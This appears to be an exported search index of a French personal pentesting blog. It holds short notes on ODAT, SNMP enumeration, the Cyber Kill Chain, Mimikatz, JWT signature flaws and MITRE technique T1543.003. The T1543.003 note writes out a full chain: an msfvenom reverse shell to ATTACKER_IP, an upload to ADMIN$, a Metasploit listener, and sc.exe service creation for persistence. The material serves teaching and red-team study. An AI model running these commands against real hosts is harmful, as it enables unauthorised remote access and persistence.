apt-get install python3-scapy -y\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo pip3 install colorlog termcolor passlib python-libnmap\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo apt-get install build-essential libgmp-dev -y\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003epip3 install pycryptodome\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e./odat.py -h \u003cspan class=\"c1\"\u003e# si l\u0026#39;instalation a reuissi \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eOracle Database Attacking Tool ( \u003ccode\u003eODAT\u003c/code\u003e) est un outil de test d\u0026rsquo;intrusion open source écrit en Python et conçu pour recenser et exploiter les vulnérabilités des bases de données Oracle. Il permet d\u0026rsquo;identifier et d\u0026rsquo;exploiter diverses failles de sécurité dans les bases de données Oracle, notamment l\u0026rsquo;injection SQL, l\u0026rsquo;exécution de code à distance et l\u0026rsquo;élévation de privilèges.\u003c/p\u003e","title":""},{"content":"Simple Network Management Protocol SNMP a été créé pour surveiller les périphériques réseau. Ce protocole permet également de gérer les tâches de configuration et de modifier les paramètres à distance.\nPour l\u0026rsquo;empreinte SNMP, nous pouvons utiliser des outils tels que snmpwalk, onesixtyoneet braa. SnmpwalkIl permet d\u0026rsquo;interroger les OID avec leurs informations.\nsnmpwalk -v2c -c public 10.129.14.128 snmpwalk -v2c -c backup 10.129.109.205 Community: admin manager public private backup sudo apt install onesixtyone onesixtyone -c /opt/useful/seclists/Discovery/SNMP/snmp.txt 10.129.14.128 utiliser avec braa pour forcer les OID individuels et énumérer les informations qui se cachent derrière eux\nsudo apt install braa braa \u0026lt;community string\u0026gt;@\u0026lt;IP\u0026gt;:.1.3.6.* # Syntax braa public@10.129.14.128:.1.3.6.* ","permalink":"https://nyobemichel.me/posts/enumeration/enumeration---snmp/","summary":"\u003cp\u003e\u003ccode\u003eSimple Network Management Protocol\u003c/code\u003e SNMP a été créé pour surveiller les périphériques réseau. Ce protocole permet également de gérer les tâches de configuration et de modifier les paramètres à distance.\u003c/p\u003e\n\u003cp\u003ePour l\u0026rsquo;empreinte SNMP, nous pouvons utiliser des outils tels que \u003ccode\u003esnmpwalk\u003c/code\u003e, \u003ccode\u003eonesixtyone\u003c/code\u003eet \u003ccode\u003ebraa\u003c/code\u003e. \u003ccode\u003eSnmpwalk\u003c/code\u003eIl permet d\u0026rsquo;interroger les OID avec leurs informations.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esnmpwalk -v2c -c public 10.129.14.128\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esnmpwalk -v2c -c backup 10.129.109.205\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eCommunity:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eadmin\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emanager\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003epublic\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eprivate\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ebackup\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo apt install onesixtyone\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eonesixtyone -c /opt/useful/seclists/Discovery/SNMP/snmp.txt 10.129.14.128\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eutiliser avec \u003ca href=\"https://github.com/mteg/braa\"\u003ebraa\u003c/a\u003e pour forcer les OID individuels et énumérer les informations qui se cachent derrière eux\u003c/p\u003e","title":""},{"content":"Inspirée des chaînes de destruction militaires, la Cyber ​​Kill Chain est un cadre de cybersécurité introduit par Lockheed Martin en 2011. Elle vise à aider les organisations à se défendre contre les cyberattaques en comprenant leur déroulement. La Cyber ​​Kill Chain divise une attaque en sept étapes :\nReconnaissance : Dans la première étape, l\u0026rsquo;attaquant recueille des informations sur la cible Armement : Une fois la reconnaissance appropriée effectuée, l\u0026rsquo;attaquant crée une charge utile livrable ou modifie une charge utile existante en fonction des vulnérabilités du système cible Livraison : Une fois prête, l\u0026rsquo;attaquant envoie la charge utile armée à la cible Exploitation : Une fois exécutée, la charge utile exploite une vulnérabilité dans le système de la cible Installation : L\u0026rsquo;exploitation permet à l\u0026rsquo;attaquant d\u0026rsquo;installer une porte dérobée ou un logiciel malveillant pour maintenir la persistance dans l\u0026rsquo;environnement de la cible Commande et contrôle ( C2 ) : En utilisant la porte dérobée installée, l\u0026rsquo;attaquant peut contrôler le système compromis Actions sur les objectifs : En arrivant jusqu\u0026rsquo;ici, l\u0026rsquo;attaquant peut désormais effectuer d\u0026rsquo;autres actions telles que l\u0026rsquo;exfiltration de données ou l\u0026rsquo;exploitation d\u0026rsquo;autres systèmes Reconnaissance La reconnaissance trouve son origine dans le domaine militaire et désigne l\u0026rsquo;acte de recueillir des informations sur une cible. En cybersécurité, cette étape consiste à recueillir des informations sur les vulnérabilités et les faiblesses de la cible afin de découvrir des points d\u0026rsquo;entrée potentiels.\n","permalink":"https://nyobemichel.me/posts/learn/cyber-kill-chain/","summary":"\u003cp\u003eInspirée des chaînes de destruction militaires, la Cyber ​​Kill Chain est un cadre de cybersécurité introduit par Lockheed Martin en 2011. Elle vise à aider les organisations à se défendre contre les cyberattaques en comprenant leur déroulement.\nLa Cyber ​​Kill Chain divise une attaque en sept étapes :\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\u003cstrong\u003eReconnaissance\u003c/strong\u003e : Dans la première étape, l\u0026rsquo;attaquant recueille des informations sur la cible\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eArmement\u003c/strong\u003e : Une fois la reconnaissance appropriée effectuée, l\u0026rsquo;attaquant crée une charge utile livrable ou modifie une charge utile existante en fonction des vulnérabilités du système cible\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eLivraison\u003c/strong\u003e : Une fois prête, l\u0026rsquo;attaquant envoie la charge utile armée à la cible\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eExploitation\u003c/strong\u003e : Une fois exécutée, la charge utile exploite une vulnérabilité dans le système de la cible\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eInstallation\u003c/strong\u003e : L\u0026rsquo;exploitation permet à l\u0026rsquo;attaquant d\u0026rsquo;installer une porte dérobée ou un logiciel malveillant pour maintenir la persistance dans l\u0026rsquo;environnement de la cible\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCommande et contrôle ( C2 )\u003c/strong\u003e : En utilisant la porte dérobée installée, l\u0026rsquo;attaquant peut contrôler le système compromis\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eActions sur les objectifs\u003c/strong\u003e : En arrivant jusqu\u0026rsquo;ici, l\u0026rsquo;attaquant peut désormais effectuer d\u0026rsquo;autres actions telles que l\u0026rsquo;exfiltration de données ou l\u0026rsquo;exploitation d\u0026rsquo;autres systèmes\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2 id=\"reconnaissance\"\u003eReconnaissance\u003c/h2\u003e\n\u003cp\u003eLa reconnaissance trouve son origine dans le domaine militaire et désigne l\u0026rsquo;acte de recueillir des informations sur une cible. En cybersécurité, cette étape consiste à recueillir des informations sur les vulnérabilités et les faiblesses de la cible afin de découvrir des points d\u0026rsquo;entrée potentiels.\u003c/p\u003e","title":""},{"content":"","permalink":"https://nyobemichel.me/posts/learn/identity-secure-score/","summary":"","title":""},{"content":"","permalink":"https://nyobemichel.me/posts/learn/lacc%C3%A8s-conditionnel/","summary":"","title":""},{"content":"https://learn.microsoft.com/en-us/security/zero-trust/deploy/identity\n","permalink":"https://nyobemichel.me/posts/learn/zero-trust---securing-identity/","summary":"\u003cp\u003e\u003ca href=\"https://learn.microsoft.com/en-us/security/zero-trust/deploy/identity\"\u003ehttps://learn.microsoft.com/en-us/security/zero-trust/deploy/identity\u003c/a\u003e\u003c/p\u003e","title":""},{"content":"","permalink":"https://nyobemichel.me/posts/microsoft/mouvement-lat%C3%A9ral-et-pivotement/","summary":"","title":""},{"content":"Processus https://learn.microsoft.com/en-us/windows/win32/procthread/about-processes-and-threads\n","permalink":"https://nyobemichel.me/posts/microsoft/windows-internal/","summary":"\u003ch1 id=\"processus\"\u003eProcessus\u003c/h1\u003e\n\u003cp\u003e\u003ca href=\"https://learn.microsoft.com/en-us/windows/win32/procthread/about-processes-and-threads\"\u003ehttps://learn.microsoft.com/en-us/windows/win32/procthread/about-processes-and-threads\u003c/a\u003e\u003c/p\u003e","title":""},{"content":"Les pirates peuvent créer ou modifier des services Windows pour exécuter de manière répétée des charges malveillantes dans le cadre de la persistance. Au démarrage de Windows, des programmes ou applications appelés services exécutent des fonctions système en arrière-plan. (Citation : TechNet Services) Les informations de configuration des services Windows, notamment le chemin d\u0026rsquo;accès aux fichiers exécutables ou aux programmes/commandes de récupération, sont stockées dans le Registre Windows.\nExample Creation d\u0026rsquo;un shell inverse\nmsfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=ATTACKER_IP LPORT=4444 -o myservice.exe Nous avons télécharger notre charge utile sur le partage ADMIN$\nsmbclient -c \u0026#39;put myservice.exe\u0026#39; -U $name$ -W $domaine \u0026#39;//$partage$/admin$/\u0026#39; $password$ Une fois notre exécutable téléchargé, nous allons configurer un écouteur sur la machine de l\u0026rsquo;attaquant pour recevoir le reverse shell de msfconsole:\nmsfconsole -q -x \u0026#34;use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST $IP$; set LPORT 4444;exploit\u0026#34; Et enfin, procédez à la création d\u0026rsquo;un nouveau service à distance en utilisant sc, en l\u0026rsquo;associant à notre binaire téléchargé\nC:\\\u0026gt; sc.exe \\\\DossierPartage create service-3249 binPath= \u0026#34;%windir%\\myservice.exe\u0026#34; start= auto C:\\\u0026gt; sc.exe \\\\DossierPartage start service-3249 https://attack.mitre.org/techniques/T1543/003/ https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1543.003/T1543.003.md?plain=1\n","permalink":"https://nyobemichel.me/posts/mitre/t1543-003---create-or-modify-system-process-windows-service/","summary":"\u003cp\u003eLes pirates peuvent créer ou modifier des services Windows pour exécuter de manière répétée des charges malveillantes dans le cadre de la persistance. Au démarrage de Windows, des programmes ou applications appelés services exécutent des fonctions système en arrière-plan. (Citation : TechNet Services) Les informations de configuration des services Windows, notamment le chemin d\u0026rsquo;accès aux fichiers exécutables ou aux programmes/commandes de récupération, sont stockées dans le Registre Windows.\u003c/p\u003e\n\u003ch4 id=\"example\"\u003eExample\u003c/h4\u003e\n\u003cp\u003eCreation d\u0026rsquo;un shell inverse\u003c/p\u003e","title":""},{"content":"","permalink":"https://nyobemichel.me/posts/outils/crunch/","summary":"","title":""},{"content":"Mimikatz est un outil de post-exploitation très populaire et puissant, le plus souvent utilisé pour vider les informations d\u0026rsquo;identification des utilisateurs à l\u0026rsquo;intérieur d\u0026rsquo;un réseau d\u0026rsquo;annuaire actif. Cependant, nous utiliserons Mimikatz afin de créer un ticket argenté.\nhttps://github.com/ParrotSec/mimikatz\n","permalink":"https://nyobemichel.me/posts/outils/mimikatz/","summary":"\u003cp\u003eMimikatz est un outil de post-exploitation très populaire et puissant, le plus souvent utilisé pour vider les informations d\u0026rsquo;identification des utilisateurs à l\u0026rsquo;intérieur d\u0026rsquo;un réseau d\u0026rsquo;annuaire actif. Cependant, nous utiliserons Mimikatz afin de créer un ticket argenté.\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/ParrotSec/mimikatz\"\u003ehttps://github.com/ParrotSec/mimikatz\u003c/a\u003e\u003c/p\u003e","title":""},{"content":"un outil de test de pénétration open source qui teste la sécurité des bases de données Oracle à distance. Grâce à ODAT, vous pouvez :\nrechercher un SID valide sur un écouteur de base de données Oracle distant via : une attaque par dictionnaire une attaque par force brute ALIAS de l\u0026rsquo;auditeur rechercher des comptes Oracle en utilisant : une attaque par dictionnaire chaque utilisateur Oracle aime le mot de passe (besoin d\u0026rsquo;un compte avant d\u0026rsquo;utiliser cette attaque) exécuter des commandes système sur le serveur de base de données en utilisant : DBMS_SCHEDULER JAVA tables externes oradbg télécharger les fichiers stockés sur le serveur de base de données en utilisant : FICHIER_UTL DBMS_XSLPROCESSOR tables externes CTXSYS DBMS_LOB télécharger des fichiers sur le serveur de base de données en utilisant : FICHIER_UTL DBMS_XSLPROCESSOR DBMS_ADVISOR supprimer des fichiers en utilisant : FICHIER_UTL obtenez un accès privilégié en utilisant les combinaisons de privilèges système suivantes (voir l\u0026rsquo;aide pour les commandes du module privesc ) : CRÉER N\u0026rsquo;IMPORTE QUELLE PROCÉDURE CRÉER UNE PROCÉDURE et EXÉCUTER N\u0026rsquo;IMPORTE QUELLE PROCÉDURE CRÉER N\u0026rsquo;IMPORTE QUEL DÉCLENCHEUR (ET CRÉER UNE PROCÉDURE) ANALYSER TOUT (ET CRÉER UNE PROCÉDURE) CRÉER N\u0026rsquo;IMPORTE QUEL INDEX (ET CRÉER UNE PROCÉDURE) envoyer/recevoir des requêtes HTTP depuis le serveur de base de données en utilisant : UTL_HTTP HttpUriType scanner les ports du serveur local ou d\u0026rsquo;un serveur distant en utilisant : UTL_HTTP HttpUriType UTL_TCP capturer une authentification SMB via : un index afin de déclencher une connexion SMB exploiter certains CVE : la CVE-2012-3137 récupérer la clé de session et le sel pour des utilisateurs arbitraires attaque par dictionnaire sur les sessions le CVE-2012-???? : Un utilisateur authentifié peut modifier toutes les tables qu\u0026rsquo;il peut sélectionner même s\u0026rsquo;il ne peut pas les modifier normalement (pas de privilège ALTER). l\u0026rsquo; attaque CVE-2012-1675 (alias attaque par empoisonnement TNS) rechercher dans les noms de colonnes grâce au module de recherche : rechercher un modèle (ex : mot de passe) dans les noms de colonnes déballer le code source PL/SQL (10g/11g et 12c) Obtenir les privilèges et les rôles système accordés . Il est également possible d\u0026rsquo;obtenir les privilèges et les rôles des rôles accordés. exécuter des requêtes SELECT arbitraires (alias shell SQL minimal) documentation : https://github.com/quentinhardy/odat/wiki\nhttps://www.kali.org/tools/odat/\n","permalink":"https://nyobemichel.me/posts/outils/odat/","summary":"\u003cp\u003eun outil de test de pénétration open source qui teste la sécurité des bases de données Oracle à distance.\nGrâce à ODAT, vous pouvez :\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003erechercher \u003cstrong\u003eun SID valide\u003c/strong\u003e sur un écouteur de base de données Oracle distant via :\n\u003cul\u003e\n\u003cli\u003eune attaque par dictionnaire\u003c/li\u003e\n\u003cli\u003eune attaque par force brute\u003c/li\u003e\n\u003cli\u003eALIAS de l\u0026rsquo;auditeur\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003erechercher des comptes\u003c/strong\u003e Oracle en utilisant :\n\u003cul\u003e\n\u003cli\u003eune attaque par dictionnaire\u003c/li\u003e\n\u003cli\u003echaque utilisateur Oracle aime le mot de passe (besoin d\u0026rsquo;un compte avant d\u0026rsquo;utiliser cette attaque)\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eexécuter des commandes système\u003c/strong\u003e sur le serveur de base de données en utilisant :\n\u003cul\u003e\n\u003cli\u003eDBMS_SCHEDULER\u003c/li\u003e\n\u003cli\u003eJAVA\u003c/li\u003e\n\u003cli\u003etables externes\u003c/li\u003e\n\u003cli\u003eoradbg\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003etélécharger les fichiers\u003c/strong\u003e stockés sur le serveur de base de données en utilisant :\n\u003cul\u003e\n\u003cli\u003eFICHIER_UTL\u003c/li\u003e\n\u003cli\u003eDBMS_XSLPROCESSOR\u003c/li\u003e\n\u003cli\u003etables externes\u003c/li\u003e\n\u003cli\u003eCTXSYS\u003c/li\u003e\n\u003cli\u003eDBMS_LOB\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003etélécharger des fichiers\u003c/strong\u003e sur le serveur de base de données en utilisant :\n\u003cul\u003e\n\u003cli\u003eFICHIER_UTL\u003c/li\u003e\n\u003cli\u003eDBMS_XSLPROCESSOR\u003c/li\u003e\n\u003cli\u003eDBMS_ADVISOR\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003esupprimer des fichiers\u003c/strong\u003e en utilisant :\n\u003cul\u003e\n\u003cli\u003eFICHIER_UTL\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eobtenez un accès privilégié\u003c/strong\u003e en utilisant les combinaisons de privilèges système suivantes (voir l\u0026rsquo;aide pour les commandes du module \u003cem\u003eprivesc\u003c/em\u003e ) :\n\u003cul\u003e\n\u003cli\u003eCRÉER N\u0026rsquo;IMPORTE QUELLE PROCÉDURE\u003c/li\u003e\n\u003cli\u003eCRÉER UNE PROCÉDURE et EXÉCUTER N\u0026rsquo;IMPORTE QUELLE PROCÉDURE\u003c/li\u003e\n\u003cli\u003eCRÉER N\u0026rsquo;IMPORTE QUEL DÉCLENCHEUR (ET CRÉER UNE PROCÉDURE)\u003c/li\u003e\n\u003cli\u003eANALYSER TOUT (ET CRÉER UNE PROCÉDURE)\u003c/li\u003e\n\u003cli\u003eCRÉER N\u0026rsquo;IMPORTE QUEL INDEX (ET CRÉER UNE PROCÉDURE)\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eenvoyer/recevoir des requêtes HTTP\u003c/strong\u003e depuis le serveur de base de données en utilisant :\n\u003cul\u003e\n\u003cli\u003eUTL_HTTP\u003c/li\u003e\n\u003cli\u003eHttpUriType\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003escanner les ports\u003c/strong\u003e du serveur local ou d\u0026rsquo;un serveur distant en utilisant :\n\u003cul\u003e\n\u003cli\u003eUTL_HTTP\u003c/li\u003e\n\u003cli\u003eHttpUriType\u003c/li\u003e\n\u003cli\u003eUTL_TCP\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ecapturer une authentification SMB\u003c/strong\u003e via :\n\u003cul\u003e\n\u003cli\u003eun index afin de déclencher une connexion SMB\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eexploiter certains CVE :\n\u003cul\u003e\n\u003cli\u003ela \u003ca href=\"http://cvedetails.com/cve/2012-3137\"\u003e\u003cstrong\u003eCVE-2012-3137\u003c/strong\u003e\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003erécupérer la clé de session et le sel pour des utilisateurs arbitraires\u003c/li\u003e\n\u003cli\u003eattaque par dictionnaire sur les sessions\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003ele \u003ca href=\"https://twitter.com/gokhanatil/status/595853921479991297\"\u003e\u003cstrong\u003eCVE-2012-????\u003c/strong\u003e\u003c/a\u003e : Un utilisateur authentifié peut modifier toutes les tables qu\u0026rsquo;il peut sélectionner même s\u0026rsquo;il ne peut pas les modifier normalement (pas de privilège ALTER).\u003c/li\u003e\n\u003cli\u003el\u0026rsquo; attaque \u003ca href=\"http://seclists.org/fulldisclosure/2012/Apr/204\"\u003e\u003cstrong\u003eCVE-2012-1675\u003c/strong\u003e\u003c/a\u003e (alias attaque par empoisonnement TNS)\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003erechercher dans les noms de colonnes\u003c/strong\u003e grâce au module \u003cem\u003ede recherche\u003c/em\u003e :\n\u003cul\u003e\n\u003cli\u003erechercher un modèle (ex : mot de passe) dans les noms de colonnes\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003edéballer\u003c/strong\u003e le code source PL/SQL (10g/11g et 12c)\u003c/li\u003e\n\u003cli\u003eObtenir les privilèges et les rôles \u003cstrong\u003esystème\u003c/strong\u003e \u003cstrong\u003eaccordés\u003c/strong\u003e . Il est également possible d\u0026rsquo;obtenir les privilèges et les rôles des rôles accordés.\u003c/li\u003e\n\u003cli\u003eexécuter des requêtes SELECT arbitraires (alias shell SQL minimal)\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003edocumentation : \u003ca href=\"https://github.com/quentinhardy/odat/wiki\"\u003ehttps://github.com/quentinhardy/odat/wiki\u003c/a\u003e\u003c/p\u003e","title":""},{"content":"JWT ( json web token )\n![[Pasted image 20250707104217.png]]\nLes JWT étant principalement utilisés dans les mécanismes d\u0026rsquo;authentification, de gestion de session et de contrôle d\u0026rsquo;accès\nLa spécification JWT est étendue par les spécifications JSON Web Signature (JWS) et JSON Web Encryption (JWE), qui définissent des méthodes concrètes d\u0026rsquo;implémentation des JWT. L\u0026rsquo;un des types de jetons les plus courants est le jeton Web JSON (JWT), qui est transmis via l\u0026rsquo; Authorization: Beareren-tête. Les JWT sont des jetons autonomes permettant de transmettre des informations de session de manière sécurisée.\nVous trouverez ci-dessous les deux requêtes cURL permettant d\u0026rsquo;interagir avec l\u0026rsquo; API . Pour l\u0026rsquo;authentification, la requête cURL suivante peut être effectuée :\ncurl -H \u0026#39;Content-Type: application/json\u0026#39; -X POST -d \u0026#39;{ \u0026#34;username\u0026#34; : \u0026#34;user\u0026#34;, \u0026#34;password\u0026#34; : \u0026#34;passwordX\u0026#34; }\u0026#39; http://MACHINE_IP/api/v1.0/exampleX curl -H \u0026#39;Authorization: Bearer [JWT token]\u0026#39; http://MACHINE_IP/api/v1.0/example2?username=Y Structure de JWT Un JWT se compose de trois composants, chacun codé en Base64Url et séparé par des points : Header - L\u0026rsquo;en-tête indique généralement le type de jeton, qui est JWT, ainsi que l\u0026rsquo;algorithme de signature utilisé. Payload la charge utile est le corps du jeton, qui contient les revendications. Une revendication est une information fournie pour une entité spécifique. Signature la signature est la partie du jeton qui fournit une méthode pour vérifier son authenticité.\nAlgorithmes de signature Aucun signature symetrique : HS256, signature asymetrique : RS256\nNe pas vérifier la signature Le premier problème avec la validation de signature survient en l\u0026rsquo;absence de validation. Si le serveur ne vérifie pas la signature du JWT, il est possible de modifier les revendications du JWT selon vos préférences.\npayload = jwt.decode(token, options={\u0026#39;verify_signature\u0026#39;: False}) La solution\nLe JWT doit toujours être vérifié ou des facteurs d\u0026rsquo;authentification supplémentaires, tels que des certificats, doivent être utilisés pour les communications de serveur à serveur. Le JWT peut être vérifié en fournissant la clé secrète (ou publique), comme illustré dans l\u0026rsquo;exemple ci-dessous :\nPayload = jwt.decode(token, self.secret, algorithms=\u0026#34;HS256\u0026#34;) Travailler avec des JWT dans Burp Suite Vous pouvez utiliser Burp Inspector pour visualiser et décoder les JWT. Vous pouvez ensuite utiliser l\u0026rsquo;extension JWT Editor pour :\nGénérer des clés de signature cryptographiques. Modifiez le JWT. Résignez le jeton avec une signature valide qui correspond au JWT modifié. https://jwt.io/ https://datatracker.ietf.org/doc/html/rfc7519 https://gchq.github.io/CyberChef/ https://docs.github.com/fr/enterprise-cloud@latest/apps/creating-github-apps/authenticating-with-a-github-app/generating-a-json-web-token-jwt-for-a-github-app https://portswigger.net/burp/documentation/desktop/testing-workflow/session-management/jwts\n","permalink":"https://nyobemichel.me/posts/web/jwt-attacks/","summary":"\u003cp\u003eJWT ( json web token )\u003c/p\u003e\n\u003cp\u003e![[Pasted image 20250707104217.png]]\u003c/p\u003e\n\u003cp\u003eLes JWT étant principalement utilisés dans les mécanismes d\u0026rsquo;authentification, de gestion de session et de contrôle d\u0026rsquo;accès\u003c/p\u003e\n\u003cp\u003eLa spécification JWT est étendue par les spécifications JSON Web Signature (JWS) et JSON Web Encryption (JWE), qui définissent des méthodes concrètes d\u0026rsquo;implémentation des JWT.\nL\u0026rsquo;un des types de jetons les plus courants est le jeton Web JSON (JWT), qui est transmis via l\u0026rsquo; \u003ccode\u003eAuthorization: Bearer\u003c/code\u003een-tête.\nLes JWT sont des jetons autonomes permettant de transmettre des informations de session de manière sécurisée.\u003c/p\u003e","title":""},{"content":"","permalink":"https://nyobemichel.me/posts/web/sql-attack/","summary":"","title":""}]